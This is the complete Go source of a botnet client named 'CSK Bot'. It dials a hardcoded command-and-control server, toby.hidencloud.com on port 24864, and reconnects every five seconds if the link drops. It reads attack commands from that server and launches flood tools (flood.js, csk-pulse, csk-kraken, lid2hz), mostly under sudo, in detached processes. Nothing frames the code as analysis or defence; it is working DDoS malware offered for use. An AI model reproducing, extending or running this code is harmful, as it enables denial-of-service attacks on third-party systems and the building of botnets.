package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	CNC_HOST = "toby.hidencloud.com"
	CNC_PORT = 24864
)

type CSKBot struct {
	client          net.Conn
	isConnected     bool
	isReconnecting  bool
	activeProcesses map[int]*exec.Cmd
	processMutex    sync.Mutex
	reconnectTimer  *time.Timer
}

func NewCSKBot() *CSKBot {
	return &CSKBot{
		isConnected:     false,
		isReconnecting:  false,
		activeProcesses: make(map[int]*exec.Cmd),
	}
}

func (bot *CSKBot) connect() {
	if bot.isConnected || bot.isReconnecting {
		return
	}

	bot.isReconnecting = true
	log.Println("Attempting to connect to C2 server...")

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", CNC_HOST, CNC_PORT), 15*time.Second)
	if err != nil {
		log.Printf("Failed to connect: %v\n", err)
		bot.isReconnecting = false
		bot.scheduleReconnect()
		return
	}

	bot.client = conn
	bot.isConnected = true
	bot.isReconnecting = false
	
	if bot.reconnectTimer != nil {
		bot.reconnectTimer.Stop()
		bot.reconnectTimer = nil
	}

	log.Println("Connected to C2 server")

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
		tcpConn.SetNoDelay(true)
	}

	go bot.readCommands()
}

func (bot *CSKBot) readCommands() {
	reader := bufio.NewReader(bot.client)
	
	for {
		bot.client.SetReadDeadline(time.Now().Add(15 * time.Second))
		
		data, err := reader.ReadString('\n')
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			
			log.Printf("Connection error: %v\n", err)
			bot.handleDisconnect()
			return
		}

		commands := strings.Split(strings.TrimSpace(data), "\n")
		for _, command := range commands {
			command = strings.TrimSpace(command)
			if command != "" {
				bot.executeCommand(command)
			}
		}
	}
}

func (bot *CSKBot) executeCommand(command string) {
	if command == "" {
		return
	}

	if strings.HasPrefix(command, "stop") {
		bot.handleStopCommand(command)
		return
	}

	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	method := strings.ToLower(parts[0])
	args := parts[1:]

	var scriptToRun string
	var useSudo bool
	var isExecutable bool

	switch method {
	case "csk-tsunami":
		scriptToRun = "flood.js"
	case "csk-pulse":
		scriptToRun = "./csk-pulse"
		useSudo = true
		isExecutable = true
	case "csk-kraken":
		scriptToRun = "./csk-kraken"
		useSudo = true
		isExecutable = true
	case "csk-deluge":
		scriptToRun = "./lid2hz"
		useSudo = true
		isExecutable = true
	default:
		log.Println("Unknown method:", method)
		return
	}

	if _, err := os.Stat(scriptToRun); os.IsNotExist(err) {
		log.Println("Script not found:", scriptToRun)
		return
	}

	log.Printf("Executing: %s with args: %v\n", method, args)
	bot.runScript(scriptToRun, args, useSudo, isExecutable)
}

func (bot *CSKBot) handleStopCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) < 2 {
		bot.stopAllProcesses()
		return
	}

	stopMethod := parts[1]
	log.Printf("Stop command received for: %s\n", stopMethod)
	bot.stopAllProcesses()
}

func (bot *CSKBot) stopAllProcesses() {
	bot.processMutex.Lock()
	defer bot.processMutex.Unlock()

	for pid, cmd := range bot.activeProcesses {
		if cmd.Process != nil {
			if err := cmd.Process.Kill(); err != nil {
				log.Printf("Error stopping process %d: %v\n", pid, err)
			} else {
				log.Printf("Stopped process PID: %d\n", pid)
			}
		}
		delete(bot.activeProcesses, pid)
	}
}

func (bot *CSKBot) runScript(scriptToRun string, args []string, useSudo bool, isExecutable bool) {
	var cmd *exec.Cmd

	if useSudo && isExecutable {
		cmdArgs := append([]string{scriptToRun}, args...)
		cmd = exec.Command("sudo", cmdArgs...)
	} else if isExecutable {
		cmd = exec.Command(scriptToRun, args...)
	} else {
		cmdArgs := append([]string{scriptToRun}, args...)
		cmd = exec.Command("node", cmdArgs...)
	}

	// Không cần SysProcAttr, process vẫn chạy được
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	if err := cmd.Start(); err != nil {
		log.Printf("Error running script: %v\n", err)
		return
	}

	pid := cmd.Process.Pid
	log.Printf("Started process PID: %d\n", pid)

	bot.processMutex.Lock()
	bot.activeProcesses[pid] = cmd
	bot.processMutex.Unlock()

	go func() {
		err := cmd.Wait()
		
		bot.processMutex.Lock()
		delete(bot.activeProcesses, pid)
		bot.processMutex.Unlock()

		if err != nil {
			log.Printf("Process %d exited with error: %v\n", pid, err)
		} else {
			log.Printf("Process %d exited successfully\n", pid)
		}
	}()
}

func (bot *CSKBot) handleDisconnect() {
	log.Println("Connection to C2 server closed")
	bot.isConnected = false
	bot.isReconnecting = false
	
	if bot.client != nil {
		bot.client.Close()
		bot.client = nil
	}
	
	bot.scheduleReconnect()
}

func (bot *CSKBot) scheduleReconnect() {
	if bot.reconnectTimer != nil {
		return
	}

	log.Println("Scheduling reconnect in 5 seconds...")
	bot.reconnectTimer = time.AfterFunc(5*time.Second, func() {
		bot.reconnectTimer = nil
		bot.connect()
	})
}

func (bot *CSKBot) cleanup() {
	log.Println("Cleaning up...")
	
	if bot.reconnectTimer != nil {
		bot.reconnectTimer.Stop()
		bot.reconnectTimer = nil
	}
	
	if bot.client != nil {
		bot.client.Close()
		bot.client = nil
	}
	
	bot.stopAllProcesses()
	bot.isConnected = false
	bot.isReconnecting = false
}

func main() {
	log.Println("Starting CSK Bot (Go version)...")
	
	bot := NewCSKBot()
	
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	
	go func() {
		<-sigChan
		log.Println("Received signal, shutting down...")
		bot.cleanup()
		os.Exit(0)
	}()
	
	bot.connect()
	
	select {}
}
